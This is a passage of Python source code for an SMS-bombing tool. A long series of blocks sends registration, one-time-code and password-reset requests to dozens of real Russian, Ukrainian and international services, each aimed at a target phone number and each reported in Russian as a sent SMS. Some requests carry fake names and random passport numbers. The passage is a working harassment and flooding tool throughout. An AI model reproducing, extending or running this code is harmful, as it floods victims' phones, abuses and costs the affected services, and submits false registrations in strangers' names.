                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",
                    headers={
                        "Referer": "https://www.ingos.ru/cabinet/registration/personal"
                    },
                    json={
                        "Birthday": "1986-07-10T07:19:56.276+02:00",
                        "DocIssueDate": "2004-02-05T07:19:56.276+02:00",
                        "DocNumber": randint(500000, 999999),
                        "DocSeries": randint(5000, 9999),
                        "FirstName": _name,
                        "Gender": "M",
                        "LastName": _name,
                        "SecondName": _name,
                        "Phone": _phone,
                        "Email": _email,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://win.1admiralxxx.ru/api/en/register.json",
                    json={
                        "mobile": _phone,
                        "bonus": "signup",
                        "agreement": 1,
                        "currency": "RUB",
                        "submit": 1,
                        "email": "",
                        "lang": "en",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://oauth.av.ru/check-phone",
                    json={"phone": (_phone, "+* (***) ***-**-**")},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
                    params={"msisdn": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://city24.ua/personalaccount/account/registration",
                    data={"PhoneNumber": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://client-api.sushi-master.ru/api/v1/auth/init",
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post("https://auth.multiplex.ua/login", json={"login": _phone})
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.niyama.ru/ajax/sendSMS.php",
                    data={
                        "REGISTER[PERSONAL_PHONE]": _phone,
                        "code": "",
                        "sendsms": "Выслать код",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.easypay.ua/api/auth/register",
                    json={"phone": _phone, "password": _password},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://fix-price.ru/ajax/register_phone_code.php",
                    data={
                        "register_call": "Y",
                        "action": "getCode",
                        "phone": "+" + _phone,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.nl.ua",
                    data={
                        "component": "bxmaker.authuserphone.login",
                        "sessid": "bf70db951f54b837748f69b75a61deb4",
                        "method": "sendCode",
                        "phone": _phone,
                        "registration": "N",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://msk.tele2.ru/api/validation/number/" + _phone,
                    json={"sender": "Tele2"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.get(
                    "https://www.finam.ru/api/smslocker/sendcode",
                    data={"phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://makimaki.ru/system/callback.php",
                    params={
                        "cb_fio": _name,
                        "cb_phone": format(_phone, "+* *** *** ** **"),
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.flipkart.com/api/6/user/signup/status",
                    headers={
                        "Origin": "https://www.flipkart.com",
                        "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop",
                    },
                    json={"loginId": "+" + _phone, "supportAllStates": True},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://secure.online.ua/ajax/check_phone/",
                    params={"reg_phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://cabinet.planetakino.ua/service/sms",
                    params={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ontaxi.com.ua/api/v2/web/client",
                    json={"country": _codes[_code].upper(), "phone": _phone,},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://smart.space/api/users/request_confirmation_code/",
                    json={"mobile": "+" + _phone, "action": "confirm_mobile"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
                    json={"phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.tarantino-family.com/wp-admin/admin-ajax.php",
                    data={
                        "action": "ajax_register_user",
                        "step": "1",
                        "security_login": "50a8c243f6",
                        "phone": _phone,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://apteka.ru/_action/auth/getForm/",
                    data={
                        "form[NAME]": "",
                        "form[PERSONAL_GENDER]": "",
                        "form[PERSONAL_BIRTHDAY]": "",
                        "form[EMAIL]": "",
                        "form[LOGIN]": (_phone, "+* (***) ***-**-**"),
                        "form[PASSWORD]": password,
                        "get-new-password": "Получите пароль по SMS",
                        "user_agreement": "on",
                        "personal_data_agreement": "on",
                        "formType": "simple",
                        "utc_offset": "120",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://uklon.com.ua/api/v1/account/code/send",
                    headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
                    json={"phone": _phone, "otpId": 0},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.get(
                    "https://requests.service.banki.ru/form/960/submit",
                    params={
                        "callback": "submitCallback",
                        "name": _name,
                        "phone": "+" + _phone,
                        "email": _email,
                        "gorod": "Москва",
                        "approving_data": "1",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.ivi.ru/mobileapi/user/register/phone/v6",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.moyo.ua/identity/registration",
                    data={"firstname": _name, "phone": _phone, "email": _email},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://helsi.me/api/healthy/accounts/login",
                    json={"phone": _phone, "platform": "PISWeb"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.kinoland.com.ua/api/v1/service/send-sms",
                    headers={"Agent": "website"},
                    json={"Phone": _phone, "Type": 1},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://pizzahut.ru/account/password-reset",
                    data={
                        "reset_by": "phone",
                        "action_id": "pass-recovery",
                        "phone": _phonePizzahut,
                        "_token": "*",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.rabota.ru/remind", data={"credential": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://rutube.ru/api/accounts/sendpass/phone",
                    data={"phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.citilink.ru/registration/confirm/phone/+"
                    + _phone
                    + "/"
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php",
                    data={"name": _name, "phone": _phone, "promo": "yellowforma"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.get(
                    "https://www.oyorooms.com/api/pwa/generateotp?phone="
                    + _phone9
                    + "&country_code=%2B7&nod=4&locale=en"
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
                    params={"pageName": "registerPrivateUserPhoneVerificatio"},
                    data={
                        "phone": _phone,
                        "recaptcha": "off",
                        "g-recaptcha-response": "",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://newnext.ru/graphql",
                    json={
                        "operationName": "registration",
                        "variables": {
                            "client": {
                                "firstName": "Иван",
                                "lastName": "Иванов",
                                "phone": _phone,
                                "typeKeys": ["Unemployed"],
                            }
                        },
                        "query": "mutation registration($client: ClientInput!) {"
                        "\n  registration(client: $client) {"
                        "\n	token\n	__typename\n  }\n}\n",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.sunlight.net/v3/customers/authorization/",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
                    json={
                        "client_type": "personal",
                        "email": _email,
                        "mobile_phone": _phone,
                        "deliveryOption": "sms",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://lk.invitro.ru/lk2/lka/patient/refreshCode",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://online.sbis.ru/reg/service/",
                    json={
                        "jsonrpc": "2.0",
                        "protocol": "5",
                        "method": "Пользователь.ЗаявкаНаФизика",
                        "params": {"phone": _phone},
                        "id": "1",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ib.psbank.ru/api/authentication/extendedClientAuthRequest",
                    json={
                        "firstName": "Иван",
                        "middleName": "Иванович",
                        "lastName": "Иванов",
                        "sex": "1",
                        "birthDate": "10.10.2000",
                        "mobilePhone": _phone9,
                        "russianFederationResident": "true",
                        "isDSA": "false",
                        "personalDataProcessingAgreement": "true",
                        "bKIRequestAgreement": "null",
                        "promotionAgreement": "true",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app.karusel.ru/api/v1/phone/", data={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
                    json={"phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
                    params={"msisdn": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.delitime.ru/api/v2/signup",
                    data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.get(
                    "https://findclone.ru/register", params={"phone": "+" + _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://guru.taxi/api/v1/driver/session/verify",
                    json={"phone": {"code": 1, "number": _phone}},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.icq.com/smsreg/requestPhoneValidation.php",
                    data={
                        "msisdn": _phone,
                        "locale": "en",
                        "countryCode": "ru",
                        "version": "1",
                        "k": "ic1rtwz1s1Hj1O0r",
                        "r": "46763",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://terra-1.indriverapp.com/api/authorization?locale=ru",
                    data={
                        "mode": "request",
                        "phone": "+" + _phone,
                        "phone_permission": "unknown",
                        "stream_id": 0,
                        "v": 3,
                        "appversion": "3.20.6",
                        "osversion": "unknown",
                        "devicemodel": "unknown",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                    data={
                        "password": password,
                        "application": "lkp",
                        "login": "+" + _phone,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.ivi.ru/mobileapi/user/register/phone/v6",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://lenta.com/api/v1/authentication/requestValidationCode",
                    json={"phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://cloud.mail.ru/api/v2/notify/applink",
                    json={
                        "phone": "+" + _phone,
                        "api": 2,
                        "email": "email",
                        "x-email": "x-email",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
                    params={"pageName": "registerPrivateUserPhoneVerificatio"},
                    data={
                        "phone": _phone,
                        "recaptcha": "off",
                        "g-recaptcha-response": "",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                    data={"st.r.phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://sso.cloud.qlean.ru/http/users/requestotp",
                    headers={
                        "Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"
                    },
                    params={
                        "phone": _phone,
                        "clientId": "undefined",
                        "sessionId": str(randint(5000, 9999)),
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                    data={"phone_number": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://passport.twitch.tv/register?trusted_request=true",
                    json={
                        "birthday": {"day": 11, "month": 11, "year": 1999},
                        "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                        "include_verification_code": True,
                        "password": password,
                        "phone_number": _phone,
                        "username": username,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://cabinet.wi-fi.ru/api/auth/by-sms",
                    data={"msisdn": _phone},
                    headers={"App-ID": "cabinet"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.wowworks.ru/v2/site/send-code",
                    json={"phone": _phone, "type": 2},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://eda.yandex/api/v1/user/request_authentication_code",
                    json={"phone_number": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://youla.ru/web-api/auth/request_code", data={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
                    json={
                        "client_type": "personal",
                        "email": f"{email}@gmail.ru",
                        "mobile_phone": _phone,
                        "deliveryOption": "sms",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.delivery-club.ru/ajax/user_otp", data={"phone": _phone}
                )
                kk = kk + 1
                print(
